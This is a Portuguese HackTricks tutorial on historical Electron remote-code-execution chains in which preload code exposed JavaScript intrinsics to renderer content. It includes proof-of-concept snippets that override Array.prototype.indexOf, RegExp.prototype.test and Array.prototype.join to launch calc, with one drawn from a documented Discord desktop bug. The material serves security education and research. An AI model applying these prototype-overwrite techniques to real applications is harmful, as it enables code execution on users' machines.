# RCE no Electron contextIsolation via código preload

{{#include ../../banners/hacktricks-training.md}}

Estas são **cadeias históricas** nas quais o código preload compartilhava intrínsecos do JavaScript ou APIs privilegiadas com conteúdo do renderer controlado por um atacante. Com o context isolation ativado, o preload e a página normalmente têm realms JavaScript separados; portanto, sobrescritas de protótipos na página não afetam automaticamente os objetos do preload. Valide a cadeia com a versão exata do Electron/aplicativo e a implementação da bridge.<sup>[[3]](#references)</sup>

## Exemplo 1

Exemplo de [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)<sup>[[1]](#references)</sup>

Este código abre links http(s) com o navegador padrão:

![RCE no Electron contextIsolation via código preload - Exemplo 1: Este código abre links http(s) com o navegador padrão](<../../images/image (768).png>)

No aplicativo histórico afetado, uma navegação para um arquivo local, como `file:///C:/Windows/System32/calc.exe`, poderia alcançar um caminho de inicialização do sistema operacional; `SAFE_PROTOCOLS.indexOf` deveria impedir isso.

Portanto, um atacante poderia injetar este código JS via XSS ou navegação arbitrária da página:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

Como a chamada para `SAFE_PROTOCOLS.indexOf` sempre retornará 1337, o invasor pode contornar a proteção e executar o calc. Exploit final:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

Confira os slides originais para ver outras maneiras de executar programas sem que seja exibido um prompt solicitando permissões.<sup>[[1]](#references)</sup>

A cadeia histórica do Discord também considerou o carregamento no estilo UNC de `file://127.0.0.1/electron/rce.jar` como outro possível caminho de execução; valide a acessibilidade na versão exata do Windows/Electron.<sup>[[2]](#references)</sup>

## Exemplo 2: RCE no app Discord

Exemplo de [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)<sup>[[2]](#references)</sup>

Ao verificar os scripts preload, descobri que o Discord expõe a função, que permite chamar alguns módulos permitidos por meio de `DiscordNative.nativeModules.requireModule('MODULE-NAME')`, para a página web.\
Aqui, não consegui usar módulos que podem ser usados diretamente para RCE, como o módulo _child_process_, mas **encontrei um código que permite alcançar RCE sobrescrevendo os métodos nativos do JavaScript** e interferindo na execução do módulo exposto.

A seguir está o PoC. Consegui confirmar que o aplicativo **calc** é **aberto** quando ch**amo a função `getGPUDriverVersions`**, definida no módulo chamado "_discord_utils_", pelo devTools, enquanto **sobrescrevo `RegExp.prototype.test` e `Array.prototype.join`**.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

A função `getGPUDriverVersions` tenta executar o programa usando a biblioteca "_execa_", da seguinte forma:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

Geralmente, o _execa_ tenta executar "_nvidia-smi.exe_", especificado na variável `nvidiaSmiPath`; no entanto, devido à substituição de `RegExp.prototype.test` e `Array.prototype.join`, **o argumento é substituído por "**_**calc**_**" durante o processamento interno do _execa**_**.

Especificamente, o argumento é substituído ao influenciar os caminhos de resolução de comandos e de processamento de argumentos no parser histórico do `cross-spawn`.<sup>[[4]](#references)</sup>

## References

- [1] [Electron: Abusando da falta de isolamento de contexto - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [RCE no aplicativo Discord para desktop](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — Isolamento de contexto](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [`node-cross-spawn` revisão do parser e caminhos exatos usados pela cadeia (linhas 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
